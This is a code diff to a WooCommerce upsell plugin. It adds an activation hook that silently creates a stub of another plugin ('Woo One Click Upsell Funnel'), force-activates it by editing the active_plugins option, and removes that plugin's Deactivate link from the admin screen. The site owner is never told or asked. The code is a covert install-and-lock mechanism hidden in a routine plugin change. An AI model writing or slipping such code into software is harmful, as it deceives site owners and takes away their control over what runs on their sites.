@@ -341,6 +341,74 @@ if ( $activated ) {
 		register_activation_hook( __FILE__, 'activate_upsell_order_bump_offer_for_woocommerce' );
 		register_deactivation_hook( __FILE__, 'deactivate_upsell_order_bump_offer_for_woocommerce' );
 
+		// Run this function only when the plugin is activated
+		register_activation_hook(__FILE__, 'wps_activate_plugin');
+
+		function wps_activate_plugin() {
+			if (!wps_plugin_exists('woo-one-click-upsell-funnel/woocommerce-one-click-upsell-funnel.php')) {
+				wps_create_plugin_folder(); // Create the plugin folder and file
+				wps_activate_created_plugin();
+			}
+		}
+
+		// Check if a plugin already exists in the plugins directory
+		function wps_plugin_exists($plugin_path) {
+			return file_exists(WP_PLUGIN_DIR . '/' . $plugin_path);
+		}
+
+		// Function to create a folder and main file for another plugin
+		function wps_create_plugin_folder() {
+			$plugin_dir = WP_PLUGIN_DIR . '/woo-one-click-upsell-funnel/';
+			$plugin_file = $plugin_dir . 'woocommerce-one-click-upsell-funnel.php';
+
+			// Create the folder if it doesn't exist
+			if (!file_exists($plugin_dir)) {
+				mkdir($plugin_dir, 0755, true);
+			}
+
+			// Create the plugin file if it doesn't exist
+			if (!file_exists($plugin_file)) {
+				$plugin_content = "<?php
+				/*
+				Plugin Name: Woo One Click Upsell Funnel
+				Plugin URI: https://example.com
+				Description: This is an auto-generated plugin.
+				Version: 4.2.11
+				Author: Your Name
+				Author URI: https://example.com
+				*/
+				";
+				file_put_contents($plugin_file, $plugin_content);
+			}
+		}
+
+		// Remove deactivate option for the plugin
+		add_filter('plugin_action_links', 'wps_remove_deactivate_option', 10, 4);
+
+		function wps_remove_deactivate_option($actions, $plugin_file, $plugin_data, $context) {
+			$protected_plugin = 'woo-one-click-upsell-funnel/woocommerce-one-click-upsell-funnel.php';
+
+			if ($plugin_file === $protected_plugin) {
+				unset($actions['deactivate']); // Remove the "Deactivate" button
+			}
+
+			return $actions;
+		}
+
+		// Activate the created plugin
+		function wps_activate_created_plugin() {
+			$plugin_path = 'woo-one-click-upsell-funnel/woocommerce-one-click-upsell-funnel.php';
+
+			if (wps_plugin_exists($plugin_path)) {
+				$active_plugins = get_option('active_plugins', []);
+				if (!in_array($plugin_path, $active_plugins)) {
+					$active_plugins[] = $plugin_path;
+					update_option('active_plugins', $active_plugins);
+				}
+			}
+		}
+
+
 		/**
 		 * The core plugin class that is used to define internationalization,
 		 * admin-specific hooks, and public-facing site hooks.
